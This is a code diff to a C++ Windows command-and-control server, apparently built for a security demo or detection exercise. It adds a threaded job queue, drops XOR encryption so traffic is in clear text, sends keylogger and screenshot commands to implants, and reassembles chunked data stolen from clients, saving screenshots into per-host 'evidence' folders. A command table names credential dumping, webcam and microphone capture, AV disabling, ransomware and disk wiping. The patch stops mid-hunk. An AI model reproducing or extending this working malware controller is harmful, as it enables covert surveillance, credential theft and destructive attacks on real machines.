@@ -25,6 +25,10 @@
 #include <ctime>
 #include <random>
 #include <algorithm>
+#include <queue>
+#include <condition_variable>
+#include <functional>
+#include <future>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "psapi.lib")
@@ -185,11 +189,42 @@ std::atomic<bool> serverRunning(true);
     // Global command queue for coordinated attacks
     std::map<std::string, std::vector<CommandType>> clientCommandQueue;
 
+    // Server job system
+    struct ServerJob {
+        std::string jobId;
+        std::string clientId;
+        std::string description;
+        std::chrono::steady_clock::time_point startTime;
+        std::function<void()> task;
+        bool completed = false;
+        
+        // Default constructor
+        ServerJob() = default;
+        
+        // Let compiler generate appropriate copy/move operations
+        // std::function is copyable, so the struct will be too
+    };
+
+    std::queue<ServerJob> serverJobQueue;
+    std::mutex serverJobQueueMutex;
+    std::condition_variable serverJobCondition;
+    std::vector<std::thread> serverWorkerThreads;
+    std::atomic<bool> shutdownServerThreads{false};
+    std::atomic<int> activeServerJobs{0};
+    std::map<std::string, std::string> serverJobStatus; // jobId -> status
+    const int NUM_SERVER_WORKER_THREADS = 6;
+
     // Forward declarations
     std::string getCommandName(CommandType cmd);
     void logActivity(const std::string& category, const std::string& type, const std::string& message);
     void executeAttackPhase(const std::string& clientId, int phase);
     void generateDNSBeacon(const std::string& serverIP, const std::string& clientIP);
+    
+    // Evidence management system - forward declarations
+    std::string createEvidenceDirectory(const std::string& clientId, const std::string& evidenceType);
+    std::string saveEvidence(const std::string& clientId, const std::string& evidenceType, 
+                           const std::string& data, const std::string& fileExtension = ".txt",
+                           const std::string& customFilename = "");
 
     // XOR encryption for C2 traffic
     std::string xorEncrypt(const std::string & data, const std::string & key = "PaloAltoEscapeRoom") {
@@ -227,6 +262,248 @@ std::atomic<bool> serverRunning(true);
             result += charset[std::rand() % (sizeof(charset) - 1)];
         }
         return result;
+    }
+    
+    // Sanitize hostname for Windows filesystem
+    std::string sanitizeHostname(const std::string& hostname) {
+        std::string sanitized;
+        for (char c : hostname) {
+            // Keep only alphanumeric, dash, underscore, and dot
+            if (std::isalnum(c) || c == '-' || c == '_' || c == '.') {
+                sanitized += c;
+            } else {
+                sanitized += '_';  // Replace invalid chars with underscore
+            }
+        }
+        
+        // Ensure it's not empty and not too long
+        if (sanitized.empty()) sanitized = "unknown";
+        if (sanitized.length() > 50) sanitized = sanitized.substr(0, 50);
+        
+        return sanitized;
+    }
+
+    // Evidence management system implementations
+    std::string createEvidenceDirectory(const std::string& clientId, const std::string& evidenceType) {
+        // Extract hostname from client info
+        std::string hostname = "unknown";
+        {
+            std::lock_guard<std::mutex> lock(clientsMutex);
+            if (connectedClients.find(clientId) != connectedClients.end()) {
+                hostname = connectedClients[clientId].hostname;
+                if (hostname.empty()) hostname = clientId.substr(0, clientId.find(':'));
+            } else {
+                hostname = clientId.substr(0, clientId.find(':'));
+            }
+        }
+        
+        // Sanitize hostname for filesystem compatibility
+        hostname = sanitizeHostname(hostname);
+        
+        // Create directory structure: C:\evidence\[hostname]\[evidence-type]
+        std::string baseDir = "C:\\evidence\\" + hostname + "\\" + evidenceType;
+        
+        // Create directories recursively
+        std::string currentPath = "C:";
+        std::vector<std::string> pathParts = {"evidence", hostname, evidenceType};
+        
+        for (const auto& part : pathParts) {
+            currentPath += "\\" + part;
+            CreateDirectoryA(currentPath.c_str(), NULL);
+        }
+        
+        return baseDir;
+    }
+    
+    std::string saveEvidence(const std::string& clientId, const std::string& evidenceType, 
+                           const std::string& data, const std::string& fileExtension,
+                           const std::string& customFilename) {
+        std::string evidenceDir = createEvidenceDirectory(clientId, evidenceType);
+        
+        // Generate filename
+        std::string filename;
+        if (!customFilename.empty()) {
+            filename = customFilename;
+        } else {
+            auto now = std::chrono::system_clock::now();
+            auto time_t = std::chrono::system_clock::to_time_t(now);
+            auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()) % 1000;
+            
+            struct tm timeinfo;
+            char timeStr[100];
+            if (localtime_s(&timeinfo, &time_t) == 0) {
+                strftime(timeStr, sizeof(timeStr), "%Y%m%d_%H%M%S", &timeinfo);
+                filename = std::string(timeStr) + "_" + std::to_string(ms.count()) + fileExtension;
+            } else {
+                filename = std::to_string(GetTickCount()) + fileExtension;
+            }
+        }
+        
+        std::string fullPath = evidenceDir + "\\" + filename;
+        
+        // Save evidence file
+        std::ofstream evidenceFile(fullPath, std::ios::binary);
+        if (evidenceFile.is_open()) {
+            evidenceFile << data;
+            evidenceFile.close();
+            
+            logActivity("EVIDENCE", "SAVED", evidenceType + " saved to " + fullPath);
+            return fullPath;
+        }
+        
+        logActivity("ERROR", "EVIDENCE_SAVE_FAILED", "Failed to save " + evidenceType + " to " + fullPath);
+        return "";
+    }
+
+    // Server job system functions
+    void initializeServerJobSystem() {
+        logActivity("THREADING", "SERVER_INIT", "Initializing server job system with " + std::to_string(NUM_SERVER_WORKER_THREADS) + " worker threads");
+        
+        shutdownServerThreads = false;
+        activeServerJobs = 0;
+        
+        // Start worker threads
+        for (int i = 0; i < NUM_SERVER_WORKER_THREADS; ++i) {
+            serverWorkerThreads.emplace_back([i]() {
+                logActivity("THREADING", "SERVER_WORKER_START", "Server worker thread " + std::to_string(i) + " started");
+                
+                while (!shutdownServerThreads) {
+                    ServerJob currentJob;
+                    bool hasJob = false;
+                    
+                    // Wait for a job
+                    {
+                        std::unique_lock<std::mutex> lock(serverJobQueueMutex);
+                        serverJobCondition.wait(lock, [] { return !serverJobQueue.empty() || shutdownServerThreads; });
+                        
+                        if (shutdownServerThreads && serverJobQueue.empty()) {
+                            break;
+                        }
+                        
+                        if (!serverJobQueue.empty()) {
+                            currentJob = std::move(serverJobQueue.front());
+                            serverJobQueue.pop();
+                            hasJob = true;
+                            
+                            // Update job status
+                            serverJobStatus[currentJob.jobId] = "RUNNING";
+                            activeServerJobs++;
+                        }
+                    }
+                    
+                    if (hasJob) {
+                        logActivity("THREADING", "SERVER_JOB_START", "Thread " + std::to_string(i) + 
+                            " executing job " + currentJob.jobId + " (" + currentJob.description + ")");
+                        
+                        try {
+                            // Execute the job
+                            currentJob.task();
+                            currentJob.completed = true;
+                            
+                            // Update job status
+                            {
+                                std::lock_guard<std::mutex> lock(serverJobQueueMutex);
+                                serverJobStatus[currentJob.jobId] = "COMPLETED";
+                            }
+                            
+                            auto duration = std::chrono::steady_clock::now() - currentJob.startTime;
+                            auto durationMs = std::chrono::duration_cast<std::chrono::milliseconds>(duration).count();
+                            
+                            logActivity("THREADING", "SERVER_JOB_COMPLETE", "Thread " + std::to_string(i) + 
+                                " completed job " + currentJob.jobId + " in " + std::to_string(durationMs) + "ms");
+                            
+                        } catch (const std::exception& e) {
+                            logActivity("THREADING", "SERVER_JOB_ERROR", "Thread " + std::to_string(i) + 
+                                " job " + currentJob.jobId + " failed: " + e.what());
+                            
+                            {
+                                std::lock_guard<std::mutex> lock(serverJobQueueMutex);
+                                serverJobStatus[currentJob.jobId] = "FAILED";
+                            }
+                        } catch (...) {
+                            logActivity("THREADING", "SERVER_JOB_ERROR", "Thread " + std::to_string(i) + 
+                                " job " + currentJob.jobId + " failed with unknown error");
+                            
+                            {
+                                std::lock_guard<std::mutex> lock(serverJobQueueMutex);
+                                serverJobStatus[currentJob.jobId] = "FAILED";
+                            }
+                        }
+                        
+                        activeServerJobs--;
+                    }
+                }
+                
+                logActivity("THREADING", "SERVER_WORKER_END", "Server worker thread " + std::to_string(i) + " terminated");
+            });
+        }
+        
+        logActivity("THREADING", "SERVER_READY", "Server job system initialized successfully");
+    }
+
+    void shutdownServerJobSystem() {
+        logActivity("THREADING", "SERVER_SHUTDOWN", "Shutting down server job system");
+        
+        // Signal shutdown
+        shutdownServerThreads = true;
+        
+        // Wake up all worker threads
+        serverJobCondition.notify_all();
+        
+        // Wait for all worker threads to finish
+        for (auto& thread : serverWorkerThreads) {
+            if (thread.joinable()) {
+                thread.join();
+            }
+        }
+        
+        // Clear remaining jobs
+        {
+            std::lock_guard<std::mutex> lock(serverJobQueueMutex);
+            while (!serverJobQueue.empty()) {
+                serverJobQueue.pop();
+            }
+            serverJobStatus.clear();
+        }
+        
+        logActivity("THREADING", "SERVER_COMPLETE", "Server job system shutdown complete");
+    }
+
+    std::string addServerJob(const std::string& clientId, const std::string& description, std::function<void()> task) {
+        static std::atomic<int> jobCounter{0};
+        std::string jobId = "SERVER_JOB_" + std::to_string(jobCounter++) + "_" + std::to_string(GetTickCount());
+        
+        {
+            std::lock_guard<std::mutex> lock(serverJobQueueMutex);
+            
+            // Use emplace to construct the job directly in the queue
+            ServerJob newJob;
+            newJob.jobId = jobId;
+            newJob.clientId = clientId;
+            newJob.description = description;
+            newJob.startTime = std::chrono::steady_clock::now();
+            newJob.task = std::move(task);
+            newJob.completed = false;
+            
+            serverJobQueue.push(std::move(newJob));
+            serverJobStatus[jobId] = "QUEUED";
+        }
+        
+        serverJobCondition.notify_one();
+        
+        logActivity("THREADING", "SERVER_JOB_QUEUED", "Added server job " + jobId + " for client " + clientId + 
+            " (" + description + ") - Queue size: " + std::to_string(serverJobQueue.size()));
+        
+        return jobId;
+    }
+
+    int getActiveServerJobCount() {
+        return activeServerJobs.load();
+    }
+
+    int getQueuedServerJobCount() {
+        std::lock_guard<std::mutex> lock(serverJobQueueMutex);
+        return static_cast<int>(serverJobQueue.size());
     }
     
     // Base64 decode function
@@ -317,6 +594,24 @@ std::atomic<bool> serverRunning(true);
         if (logFile.is_open()) {
             logFile << "[" << timeStr << "] [" << category << "] [" << type << "] " << message << std::endl;
             logFile.close();
+        }
+
+        // Command tracking log for persistent command status
+        if (category == "CMD_SENT" || category == "CMD_RESPONSE" || category == "CMD_STATUS") {
+            std::ofstream cmdLog("C:\\temp\\c2_command_log.txt", std::ios::app);
+            if (cmdLog.is_open()) {
+                cmdLog << "[" << timeStr << "] [" << category << "] [" << type << "] " << message << std::endl;
+                cmdLog.close();
+            }
+        }
+        
+        // Server-side status logging for real-time monitoring
+        if (category == "CMD_SENT" || category == "CMD_RESPONSE" || category == "SERVER_STATUS") {
+            std::ofstream statusLog("C:\\temp\\c2_server_status.txt", std::ios::app);
+            if (statusLog.is_open()) {
+                statusLog << "[" << timeStr << "] [" << category << "] [" << type << "] " << message << std::endl;
+                statusLog.close();
+            }
         }
 
         // Separate attack log for XDR correlation
@@ -415,12 +710,16 @@ std::atomic<bool> serverRunning(true);
         packet.payloadSize = 0;
         packet.checksum = 0xDEADBEEF;
 
-        // Send encrypted packet
-        std::string encryptedPacket = xorEncrypt(std::string((char*)&packet, sizeof(packet)));
-        int bytesSent = send(clientSocket, encryptedPacket.c_str(), encryptedPacket.size(), 0);
+        // Send clear text packet  
+        std::string clearPacket = std::string((char*)&packet, sizeof(packet));
+        int bytesSent = send(clientSocket, clearPacket.c_str(), clearPacket.size(), 0);
 
-        // Log the command with debug info
+        // Log the command with enhanced tracking
         std::string cmdName = getCommandName(cmd);
+        std::string commandId = "SRV_CMD_" + std::to_string(packet.sequenceNum) + "_" + std::to_string(GetTickCount());
+        
+        // Log command sent with tracking info
+        logActivity("CMD_SENT", "COMMAND_DISPATCH", "[" + commandId + "] Command " + cmdName + " sent to " + clientId + " (" + std::to_string(bytesSent) + " bytes)");
         
         // Enhanced visibility of commands being sent
         std::cout << "\n\033[1;33m[!] SENDING COMMAND: " << cmdName << " (ID: " << cmd << ") to " << clientId << "\033[0m" << std::endl;
@@ -428,10 +727,9 @@ std::atomic<bool> serverRunning(true);
         logActivity("DEBUG", "COMMAND_PACKET_SENT", "Sent " + cmdName + " packet to " + clientId + " - Bytes: " + std::to_string(bytesSent) + " - Command ID: " + std::to_string(cmd));
         logActivity("C2", "COMMAND_SENT", "Sent " + cmdName + " to " + clientId);
         
-        // Send additional text command for better client compatibility
-        std::string textCommand = "CMD:" + cmdName + ":REQUEST_DATA\n";
-        std::string encryptedText = xorEncrypt(textCommand);
-        int textBytesSent = send(clientSocket, encryptedText.c_str(), encryptedText.size(), 0);
+        // Send additional text command for better client compatibility (clear text)
+        std::string textCommand = "" + cmdName + ":REQUEST_DATA\n";
+        int textBytesSent = send(clientSocket, textCommand.c_str(), textCommand.size(), 0);
         
         logActivity("DEBUG", "TEXT_COMMAND_SENT", "Sent text command to " + clientId + " - Command: " + textCommand + " - Bytes: " + std::to_string(textBytesSent));
         
@@ -439,56 +737,98 @@ std::atomic<bool> serverRunning(true);
         totalCommandsSent++;
     }
 
-    // Get command name for logging
+    // Get command name for logging with comprehensive descriptions
     std::string getCommandName(CommandType cmd) {
         switch (cmd) {
-        case CMD_BEACON: return "BEACON";
+        // Basic C2
+        case CMD_BEACON: return "HEARTBEAT_BEACON";
+        case CMD_HEARTBEAT: return "CONNECTION_HEARTBEAT";
+        
+        // Reconnaissance (Discovery)
         case CMD_SYSINFO: return "SYSTEM_INFO_COLLECTION";
         case CMD_PROCESS_LIST: return "PROCESS_ENUMERATION";
+        case CMD_NETWORK_CONFIG: return "NETWORK_CONFIGURATION_DISCOVERY";
+        case CMD_USER_ENUM: return "USER_ACCOUNT_ENUMERATION";
+        case CMD_DOMAIN_INFO: return "DOMAIN_INFORMATION_GATHERING";
+        case CMD_SOFTWARE_ENUM: return "SOFTWARE_DISCOVERY";
+        
+        // Collection
         case CMD_SCREENSHOT: return "SCREENSHOT_CAPTURE";
         case CMD_KEYLOG_START: return "KEYLOGGER_ACTIVATION";
         case CMD_KEYLOG_DUMP: return "KEYLOGGER_DATA_RETRIEVAL";
-        case CMD_BROWSER_CREDS: return "CREDENTIAL_THEFT";
-        case CMD_WEBCAM_CAPTURE: return "WEBCAM_ACTIVATION";
-        case CMD_MICROPHONE_RECORD: return "MICROPHONE_RECORDING";
+        case CMD_CLIPBOARD: return "CLIPBOARD_DATA_COLLECTION";
+        case CMD_BROWSER_CREDS: return "BROWSER_CREDENTIAL_THEFT";
+        case CMD_FILE_SEARCH: return "FILE_SYSTEM_SEARCH";
+        case CMD_WEBCAM_CAPTURE: return "WEBCAM_SURVEILLANCE";
+        case CMD_MICROPHONE_RECORD: return "AUDIO_RECORDING";
         case CMD_SCREEN_RECORD: return "SCREEN_RECORDING";
-        case CMD_SHELL_EXEC: return "REMOTE_SHELL_EXECUTION";
-        case CMD_POWERSHELL: return "POWERSHELL_EXECUTION";
-        case CMD_INJECT_PROCESS: return "PROCESS_INJECTION";
+        
+        // Execution
+        case CMD_SHELL_EXEC: return "COMMAND_SHELL_EXECUTION";
+        case CMD_POWERSHELL: return "POWERSHELL_SCRIPT_EXECUTION";
+        case CMD_INJECT_PROCESS: return "MALICIOUS_PROCESS_INJECTION";
+        case CMD_LOAD_MODULE: return "DYNAMIC_MODULE_LOADING";
+        case CMD_MIGRATE_PROCESS: return "PROCESS_MIGRATION";
         case CMD_REVERSE_SHELL: return "REVERSE_SHELL_CONNECTION";
         case CMD_REMOTE_DESKTOP: return "REMOTE_DESKTOP_ACCESS";
-        case CMD_REGISTRY_PERSIST: return "REGISTRY_PERSISTENCE";
+        
+        // Persistence
+        case CMD_INSTALL_SERVICE: return "MALICIOUS_SERVICE_INSTALLATION";
+        case CMD_REGISTRY_PERSIST: return "REGISTRY_PERSISTENCE_MECHANISM";
         case CMD_SCHEDULED_TASK: return "SCHEDULED_TASK_PERSISTENCE";
         case CMD_WMI_PERSIST: return "WMI_EVENT_PERSISTENCE";
+        case CMD_STARTUP_FOLDER: return "STARTUP_FOLDER_PERSISTENCE";
         case CMD_BOOTKIT_INSTALL: return "BOOTKIT_INSTALLATION";
+        
+        // Lateral Movement
         case CMD_PORT_SCAN: return "NETWORK_PORT_SCANNING";
         case CMD_SMB_SCAN: return "SMB_SHARE_ENUMERATION";
         case CMD_PSEXEC: return "PSEXEC_LATERAL_MOVEMENT";
         case CMD_WMI_EXEC: return "WMI_REMOTE_EXECUTION";
+        case CMD_RDP_EXEC: return "RDP_LATERAL_MOVEMENT";
         case CMD_PASS_THE_HASH: return "PASS_THE_HASH_ATTACK";
         case CMD_MIMIKATZ_EXEC: return "MIMIKATZ_CREDENTIAL_DUMP";
-        case CMD_UAC_BYPASS: return "UAC_BYPASS_ATTEMPT";
+        
+        // Privilege Escalation
+        case CMD_UAC_BYPASS: return "UAC_BYPASS_EXPLOITATION";
+        case CMD_TOKEN_STEAL: return "ACCESS_TOKEN_THEFT";
+        case CMD_EXPLOIT_SUGGESTER: return "PRIVILEGE_ESCALATION_ENUMERATION";
         case CMD_LSASS_DUMP: return "LSASS_MEMORY_DUMP";
-        case CMD_SAM_DUMP: return "SAM_DATABASE_DUMP";
+        case CMD_SAM_DUMP: return "SAM_DATABASE_EXTRACTION";
+        
+        // Defense Evasion
         case CMD_DISABLE_AV: return "ANTIVIRUS_DISABLING";
-        case CMD_CLEAR_LOGS: return "LOG_CLEARING";
-        case CMD_PROCESS_HOLLOW: return "PROCESS_HOLLOWING";
+        case CMD_CLEAR_LOGS: return "EVENT_LOG_CLEARING";
+        case CMD_TIMESTOMP: return "FILE_TIMESTAMP_MANIPULATION";
+        case CMD_PROCESS_HOLLOW: return "PROCESS_HOLLOWING_INJECTION";
         case CMD_ROOTKIT_INSTALL: return "ROOTKIT_INSTALLATION";
-        case CMD_AMSI_BYPASS: return "AMSI_BYPASS_ATTEMPT";
-        case CMD_ETW_DISABLE: return "ETW_PROVIDER_DISABLING";
+        case CMD_AMSI_BYPASS: return "AMSI_BYPASS_TECHNIQUE";
+        case CMD_ETW_DISABLE: return "ETW_LOGGING_DISABLING";
+        
+        // Exfiltration
+        case CMD_STAGE_FILES: return "DATA_STAGING_FOR_EXFILTRATION";
+        case CMD_COMPRESS_DATA: return "DATA_COMPRESSION";
         case CMD_EXFIL_HTTP: return "HTTP_DATA_EXFILTRATION";
-        case CMD_EXFIL_DNS: return "DNS_TUNNELING_EXFILTRATION";
+        case CMD_EXFIL_DNS: return "DNS_TUNNEL_EXFILTRATION";
+        case CMD_EXFIL_ICMP: return "ICMP_TUNNEL_EXFILTRATION";
         case CMD_EXFIL_EMAIL: return "EMAIL_DATA_EXFILTRATION";
-        case CMD_CLOUD_UPLOAD: return "CLOUD_STORAGE_UPLOAD";
+        case CMD_CLOUD_UPLOAD: return "CLOUD_SERVICE_UPLOAD";
+        
+        // Impact
         case CMD_RANSOMWARE: return "RANSOMWARE_DEPLOYMENT";
+        case CMD_WIPE_DISK: return "DISK_WIPING_ATTACK";
+        case CMD_CORRUPT_BOOT: return "BOOT_SECTOR_CORRUPTION";
         case CMD_CRYPTO_MINER: return "CRYPTOCURRENCY_MINING";
+        
+        // Advanced Network Evasion
         case CMD_TOR_CONNECT: return "TOR_NETWORK_CONNECTION";
-        case CMD_TOR_API_CALL: return "TOR_EXIT_NODE_API_CALL";
+        case CMD_TOR_API_CALL: return "TOR_API_COMMUNICATION";
         case CMD_REVERSE_SSH: return "REVERSE_SSH_TUNNEL";
-        case CMD_NETCAT_TUNNEL: return "NETCAT_TUNNEL_ESTABLISHED";
-        case CMD_SOCAT_RELAY: return "SOCAT_RELAY_ACTIVATED";
-        case CMD_CRYPTCAT_TUNNEL: return "CRYPTCAT_TUNNEL_ESTABLISHED";
-        default: return "UNKNOWN_COMMAND";
+        case CMD_NETCAT_TUNNEL: return "NETCAT_NETWORK_TUNNEL";
+        case CMD_SOCAT_RELAY: return "SOCAT_NETWORK_RELAY";
+        case CMD_CRYPTCAT_TUNNEL: return "CRYPTCAT_ENCRYPTED_TUNNEL";
+        
+        default: return "UNKNOWN_COMMAND_" + std::to_string(cmd);
         }
     }
 
@@ -646,7 +986,7 @@ std::atomic<bool> serverRunning(true);
         std::vector<std::string> commands = {
             "KEYLOG:START:HOOK\n",
             "KEYLOGGER:ACTIVATE:SEND\n",
-            "CMD:KEYLOG:START\n",
+            "KEYLOG:START\n",
             "START_KEYLOGGER_WITH_TRANSFER\n"
         };
         
@@ -672,7 +1012,7 @@ std::atomic<bool> serverRunning(true);
             "KEYLOG:DUMP\n",
             "KEYLOG:DUMP:SEND\n",
             "KEYLOGGER:RETRIEVE:DATA\n",
-            "CMD:KEYLOG:DUMP\n",
+            "KEYLOG:DUMP\n",
             "DUMP_KEYLOG_DATA_NOW\n"
         };
         
@@ -688,8 +1028,7 @@ std::atomic<bool> serverRunning(true);
         
         // Request immediate response
         std::string responseRequest = "RESPOND:KEYLOG:STATUS\n";
-        std::string encryptedReq = xorEncrypt(responseRequest);
-        send(clientSocket, encryptedReq.c_str(), encryptedReq.size(), 0);
+        send(clientSocket, responseRequest.c_str(), responseRequest.size(), 0);
         logActivity("DEBUG", "KEYLOG_RESPONSE_REQUEST", "Requested keylog status from " + clientId);
     }
 
@@ -737,7 +1076,7 @@ std::atomic<bool> serverRunning(true);
         std::vector<std::string> commands = {
             "SCREEN:CAPTURE:TRANSFER\n",
             "SCREENSHOT:TAKE:SEND\n", 
-            "CMD:SCREENSHOT:EXECUTE\n",
+            "SCREENSHOT:EXECUTE\n",
             "CAPTURE_SCREEN_AND_SEND\n"
         };
         
@@ -757,8 +1096,7 @@ std::atomic<bool> serverRunning(true);
         
         // Request immediate response
         std::string responseRequest = "RESPOND:SCREENSHOT:STATUS\n";
-        std::string encryptedReq = xorEncrypt(responseRequest);
-        send(clientSocket, encryptedReq.c_str(), encryptedReq.size(), 0);
+        send(clientSocket, responseRequest.c_str(), responseRequest.size(), 0);
         logActivity("DEBUG", "RESPONSE_REQUEST", "Requested screenshot status from " + clientId);
     }
 
@@ -1345,6 +1683,12 @@ std::atomic<bool> serverRunning(true);
         // Main C2 loop
         int attackPhase = 0;
         auto lastPhaseTime = std::chrono::steady_clock::now();
+        
+        // Data buffering for chunked data
+        std::string chunkedDataBuffer;
+        bool receivingChunks = false;
+        int expectedChunks = 0;
+        int receivedChunks = 0;
 
         while (serverRunning && client.isActive) {
             // Update beacon count and last seen
@@ -1768,25 +2112,83 @@ std::atomic<bool> serverRunning(true);
                     size_t previewLen = totalData.length() > 50 ? 50 : totalData.length();
                     logActivity("DEBUG", "RAW_DATA_RECEIVED", "From " + clientId + " - Total bytes: " + std::to_string(totalData.length()) + " - First 50 chars: " + totalData.substr(0, previewLen));
                     
-                    std::string decrypted = xorEncrypt(totalData);
+                    std::string clearTextData = totalData; // No encryption - clear text
                     
-                    // Debug: Log decrypted data
-                    std::string preview = decrypted.length() > 100 ? decrypted.substr(0, 100) + "..." : decrypted;
-                    logActivity("DEBUG", "DECRYPTED_DATA", "From " + clientId + " - Length: " + std::to_string(decrypted.length()) + " - Preview: " + preview);
+                    // Check if this is chunked data
+                    if (clearTextData.find("CHUNK:") == 0) {
+                        if (!receivingChunks) {
+                            // Start receiving chunks
+                            receivingChunks = true;
+                            chunkedDataBuffer.clear();
+                            receivedChunks = 0;
+                            
+                            // Parse expected chunks from first chunk
+                            size_t pos = clearTextData.find('\n');
+                            if (pos != std::string::npos) {
+                                std::string header = clearTextData.substr(0, pos);
+                                size_t slashPos = header.find('/');
+                                if (slashPos != std::string::npos) {
+                                    size_t colonPos = header.find(':', slashPos);
+                                    if (colonPos != std::string::npos) {
+                                        expectedChunks = std::stoi(header.substr(slashPos + 1, colonPos - slashPos - 1));
+                                        logActivity("C2", "CHUNK_START", "Starting to receive " + std::to_string(expectedChunks) + " chunks from " + clientId);
+                                    }
+                                }
+                            }
+                        }
+                        
+                        // Extract chunk data (skip header and separator)
+                        size_t headerEnd = clearTextData.find('\n');
+                        size_t separatorStart = clearTextData.find("\n---CHUNK---\n");
+                        
+                        if (headerEnd != std::string::npos && separatorStart != std::string::npos) {
+                            std::string chunkData = clearTextData.substr(headerEnd + 1, separatorStart - headerEnd - 1);
+                            chunkedDataBuffer += chunkData;
+                            receivedChunks++;
+                            
+                            logActivity("C2", "CHUNK_RECEIVED", "Received chunk " + std::to_string(receivedChunks) + "/" + std::to_string(expectedChunks) + " from " + clientId);
+                        }
+                        
+                        // Skip to next iteration to wait for more chunks
+                        continue;
+                    } else if (clearTextData.find("CHUNK:COMPLETE:") == 0) {
+                        // All chunks received, process complete data
+                        logActivity("C2", "CHUNK_COMPLETE", "All chunks received from " + clientId + ", processing complete data (" + std::to_string(chunkedDataBuffer.length()) + " bytes)");
+                        clearTextData = chunkedDataBuffer;
+                        
+                        // Reset chunk state
+                        receivingChunks = false;
+                        chunkedDataBuffer.clear();
+                        expectedChunks = 0;
+                        receivedChunks = 0;
+                    } else if (receivingChunks) {
+                        // We were expecting chunks but got regular data - this might be an error
+                        logActivity("C2", "CHUNK_ERROR", "Expected chunked data but received regular data from " + clientId + ", resetting state");
+                        receivingChunks = false;
+                        chunkedDataBuffer.clear();
+                        expectedChunks = 0;
+                        receivedChunks = 0;
+                    }
+                    
+                    // Debug: Log clear text data
+                    std::string preview = clearTextData.length() > 100 ? clearTextData.substr(0, 100) + "..." : clearTextData;
+                    logActivity("DEBUG", "CLEAR_TEXT_DATA", "From " + clientId + " - Length: " + std::to_string(clearTextData.length()) + " - Preview: " + preview);
                     
                     // Enhanced visibility for client responses
-                    if (decrypted.find("RDP:") == 0 || decrypted.find("SSH:") == 0 || 
-                        decrypted.find("NETCAT:") == 0 || decrypted.find("SOCAT:") == 0 ||
-                        decrypted.find("TOR") == 0) {
+                    if (clearTextData.find("RDP:") == 0 || clearTextData.find("SSH:") == 0 || 
+                        clearTextData.find("NETCAT:") == 0 || clearTextData.find("SOCAT:") == 0 ||
+                        clearTextData.find("TOR") == 0) {
                         std::cout << "\n\033[1;36m[+] CLIENT RESPONSE: " << preview << "\033[0m\n";
                     }
                     
-                    logActivity("C2", "CLIENT_RESPONSE", "From " + clientId + ": " + preview);
+                    // Log response with enhanced tracking
+                    std::string responseId = "RESP_" + std::to_string(GetTickCount()) + "_" + clientId;
+                    logActivity("CMD_RESPONSE", "RESPONSE_RECEIVED", "[" + responseId + "] From " + clientId + ": " + preview + " (" + std::to_string(clearTextData.length()) + " bytes)");
 
                     // Process specific response types - check for ANY data transfer
                     bool dataProcessed = false;
                     
-                    if (decrypted.find("SCREENSHOT:") == 0 || decrypted.find("SCREEN:") == 0) {
+                    if (clearTextData.find("SCREENSHOT:") == 0 || clearTextData.find("SCREEN:") == 0) {
                         // Handle screenshot data
                         logActivity("COLLECTION", "SCREENSHOT_RECEIVED", "Processing screenshot data from " + clientId);
                         dataProcessed = true;
@@ -1794,10 +2196,10 @@ std::atomic<bool> serverRunning(true);
                         // Create screenshots directory
                         CreateDirectoryA("C:\\Windows\\Temp\\C2_Screenshots", NULL);
                         
-                        if (decrypted.find("SCREENSHOT:DATA:START") == 0 || decrypted.find("SCREEN:DATA:") == 0) {
+                        if (clearTextData.find("SCREENSHOT:DATA:START") == 0 || clearTextData.find("SCREEN:DATA:") == 0) {
                             // Extract screenshot data
-                            size_t startPos = decrypted.find("Data:") + 5;
-                            size_t endPos = decrypted.find("\nSCREENSHOT:DATA:END");
+                            size_t startPos = clearTextData.find("Data:") + 5;
+                            size_t endPos = clearTextData.find("\nSCREENSHOT:DATA:END");
                             
                             if (startPos != std::string::npos && endPos != std::string::npos) {
                                 // Extract metadata
@@ -1805,35 +2207,35 @@ std::atomic<bool> serverRunning(true);
                                 std::string timestamp = "";
                                 std::string origFilename = "";
                                 
-                                size_t resPos = decrypted.find("Resolution:");
+                                size_t resPos = clearTextData.find("Resolution:");
                                 if (resPos != std::string::npos) {
                                     resPos += 11;
-                                    size_t resEnd = decrypted.find("\n", resPos);
+                                    size_t resEnd = clearTextData.find("\n", resPos);
                                     if (resEnd != std::string::npos) {
-                                        resolution = decrypted.substr(resPos, resEnd - resPos);
+                                        resolution = clearTextData.substr(resPos, resEnd - resPos);
                                     }
                                 }
                                 
-                                size_t timePos = decrypted.find("Timestamp:");
+                                size_t timePos = clearTextData.find("Timestamp:");
                                 if (timePos != std::string::npos) {
                                     timePos += 10;
-                                    size_t timeEnd = decrypted.find("\n", timePos);
+                                    size_t timeEnd = clearTextData.find("\n", timePos);
                                     if (timeEnd != std::string::npos) {
-                                        timestamp = decrypted.substr(timePos, timeEnd - timePos);
+                                        timestamp = clearTextData.substr(timePos, timeEnd - timePos);
                                     }
                                 }
                                 
-                                size_t filePos = decrypted.find("Filename:");
+                                size_t filePos = clearTextData.find("Filename:");
                                 if (filePos != std::string::npos) {
                                     filePos += 9;
-                                    size_t fileEnd = decrypted.find("\n", filePos);
+                                    size_t fileEnd = clearTextData.find("\n", filePos);
                                     if (fileEnd != std::string::npos) {
-                                        origFilename = decrypted.substr(filePos, fileEnd - filePos);
+                                        origFilename = clearTextData.substr(filePos, fileEnd - filePos);
                                     }
                                 }
                                 
                                 // Get base64 data
-                                std::string base64Data = decrypted.substr(startPos, endPos - startPos);
+                                std::string base64Data = clearTextData.substr(startPos, endPos - startPos);
                                 
                                 // Create screenshots directory
                                 CreateDirectoryA("C:\\Windows\\Temp\\C2_Screenshots", NULL);
@@ -1841,82 +2243,55 @@ std::atomic<bool> serverRunning(true);
                                 // Decode base64 to binary
                                 std::vector<unsigned char> decodedData = base64Decode(base64Data);
                                 
-                                // Save screenshot as BMP file (client captures in BMP format)
-                                std::string screenshotFile = "C:\\Windows\\Temp\\C2_Screenshots\\" + 
-                                                           clientId.substr(0, clientId.find(':')) + "_" +
-                                                           std::to_string(GetTickCount()) + "_screenshot.bmp";
+                                // Save screenshot using organized evidence system
+                                std::string bmpData(reinterpret_cast<const char*>(decodedData.data()), decodedData.size());
+                                std::string screenshotFile = saveEvidence(clientId, "screenshots", bmpData, ".bmp");
                                 
-                                std::ofstream screenshot(screenshotFile, std::ios::binary);
-                                if (screenshot.is_open()) {
-                                    screenshot.write(reinterpret_cast<const char*>(decodedData.data()), decodedData.size());
-                                    screenshot.close();
-                                    logActivity("COLLECTION", "SCREENSHOT_SAVED", "Screenshot saved as BMP to " + screenshotFile);
-                                    
-                                    // Log file size for verification
